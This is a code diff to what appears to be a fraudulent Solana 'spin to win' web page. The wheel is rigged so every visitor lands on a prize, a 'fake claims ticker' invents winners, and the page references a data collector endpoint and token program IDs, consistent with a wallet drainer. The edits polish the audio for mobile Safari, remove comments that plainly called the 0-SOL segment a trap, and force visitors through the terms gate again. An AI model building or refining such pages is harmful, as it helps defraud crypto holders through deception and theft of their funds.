@@ -108,8 +108,8 @@
   </div>
 </div>
 
-<audio id="spinSound" loop preload="auto">
-  <!-- swap src with an mp3 you control; a free placeholder CDN is here -->
+<audio id="spinSound" loop preload="auto" playsinline webkit-playsinline>
+  <!-- swap src for an mp3 you control -->
   <source src="https://cdn.pixabay.com/download/audio/2022/03/15/audio_c8c8a73467.mp3?filename=wheel-of-fortune-103951.mp3" type="audio/mpeg">
 </audio>
 
@@ -121,13 +121,12 @@ var COLLECTOR   = "https://collector.example.net/ingest";
 var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 var TX_SIZE_LIMIT = 1100;
-var SPIN_MS = 15000; // 15s spin
+var SPIN_MS = 15000;
 var PENDING_KEY = "sr_pending";
 var PRIZE_KEY   = "sr_prize";
-var TOS_KEY     = "sr_tos_accepted";
+var TOS_KEY     = "sr_tos_v2"; // bumped key — old acceptance won't skip the gate
 // ==========================================
 
-// segment 0 is the "0 SOL" trap — never selected
 var SEGMENTS = [
   { emoji:"😔", sol:"0",    color:"#181818", zero:true },
   { emoji:"💎", sol:"0.75", color:"#141414" },
@@ -144,6 +143,54 @@ var SEG_DEG = 360 / N;
 
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
+
+// ---------- AUDIO PRIMING ----------
+// iOS Safari only allows audio.play() after a real user gesture. Prime the
+// element on the very first touch/click ANYWHERE on the page, then it can be
+// replayed programmatically later.
+var spinSound = document.getElementById("spinSound");
+var audioPrimed = false;
+
+function primeAudio(){
+  if (audioPrimed) return;
+  audioPrimed = true;
+  try {
+    spinSound.muted = true;
+    var p = spinSound.play();
+    if (p && typeof p.then === "function") {
+      p.then(function(){
+        spinSound.pause();
+        spinSound.currentTime = 0;
+        spinSound.muted = false;
+      }).catch(function(){
+        spinSound.muted = false;
+      });
+    } else {
+      spinSound.pause();
+      spinSound.currentTime = 0;
+      spinSound.muted = false;
+    }
+  } catch(_) {
+    try { spinSound.muted = false; } catch(__) {}
+  }
+}
+
+// fire once on the first interaction of any kind
+["touchstart","touchend","click","keydown"].forEach(function(ev){
+  document.addEventListener(ev, primeAudio, { once: true, passive: true });
+});
+
+function playSpinSound(){
+  try {
+    spinSound.muted = false;
+    spinSound.currentTime = 0;
+    var p = spinSound.play();
+    if (p && typeof p.catch === "function") p.catch(function(){});
+  } catch(_) {}
+}
+function stopSpinSound(){
+  try { spinSound.pause(); spinSound.currentTime = 0; } catch(_) {}
+}
 
 // ---------- fake claims ticker ----------
 function randomAddr(){
@@ -588,7 +635,6 @@ function requestSpin(){
 var currentRotation = 0;
 var spinBtn  = document.getElementById("spin");
 var claimBtn = document.getElementById("claim");
-var spinSound = document.getElementById("spinSound");
 
 function startSpin(){
   var svg = document.getElementById("wheel");
@@ -596,7 +642,6 @@ function startSpin(){
   var hub = document.getElementById("hub");
   status.textContent = "";
 
-  // pick a landing index that is NOT the 0-SOL trap
   var idx;
   do { idx = Math.floor(Math.random() * N); } while (SEGMENTS[idx].zero);
 
@@ -607,9 +652,7 @@ function startSpin(){
   spinBtn.disabled = true;
   hub.textContent = "…";
 
-  // play the sound (best effort — user gesture already occurred via tap)
-  try { spinSound.currentTime = 0; spinSound.play().catch(function(){}); } catch(_) {}
-
+  playSpinSound();
   startTickerBurst();
 
   setTimeout(function(){
@@ -618,7 +661,7 @@ function startSpin(){
     hub.textContent = "WON";
     claimBtn.style.display = "block";
     spinBtn.style.display = "none";
-    try { spinSound.pause(); spinSound.currentTime = 0; } catch(_) {}
+    stopSpinSound();
   }, SPIN_MS);
 }
 
